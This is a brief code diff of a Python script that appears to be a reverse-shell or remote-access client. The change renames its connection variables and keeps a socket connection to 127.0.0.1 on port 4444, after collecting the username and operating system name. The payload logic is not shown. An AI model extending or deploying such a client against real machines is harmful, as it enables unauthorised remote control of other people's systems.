@@ -5,9 +5,6 @@ from socket import *
 import subprocess
 import platform
 
-host = "127.0.0.1"
-port = 4444
-
 def send_message(connection, message):
     try:
         message = message.encode()
@@ -35,8 +32,11 @@ get_os = platform.uname()[0]
 get_user = getuser()
 os_info = "Name: "+str(get_user)+" <-> "+"OS: "+str(get_os)
 
+ip = "127.0.0.1"
+port = 4444
+
 connection = socket(AF_INET, SOCK_STREAM)
-connection.connect((host, port))
+connection.connect((ip, port))
 
 current_directory = os.getcwd()
 
